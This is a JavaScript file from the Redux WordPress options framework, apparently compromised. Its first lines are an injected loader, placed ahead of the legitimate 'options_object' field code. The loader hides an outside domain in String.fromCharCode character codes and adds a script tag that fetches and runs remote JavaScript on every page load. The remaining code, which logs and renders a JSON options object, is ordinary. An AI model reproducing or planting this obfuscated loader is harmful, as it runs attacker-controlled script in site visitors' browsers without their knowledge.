var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/*global redux_change, redux*/

(function( $ ) {
    "use strict";

    redux.field_objects                 = redux.field_objects || {};
    redux.field_objects.options_object  = redux.field_objects.options_object || {};

//    $( document ).ready(
//        function() {
//            redux.field_objects.import_export.init();
//        }
//    );

    redux.field_objects.options_object.init = function( selector ) {

        if ( !selector ) {
            selector = $( document ).find( '.redux-container-options_object' );
        }

        var parent = selector;

        if ( !selector.hasClass( 'redux-field-container' ) ) {
            parent = selector.parents( '.redux-field-container:first' );
        }

        if ( parent.hasClass( 'redux-field-init' ) ) {
            parent.removeClass( 'redux-field-init' );
        } else {
            return;
        }

        $( '#consolePrintObject' ).on(
            'click', function( e ) {
                e.preventDefault();
                console.log( $.parseJSON( $( "#redux-object-json" ).html() ) );
            }
        );

        if ( typeof jsonView === 'function' ) {
            jsonView( '#redux-object-json', '#redux-object-browser' );
        }        
    };
})( jQuery );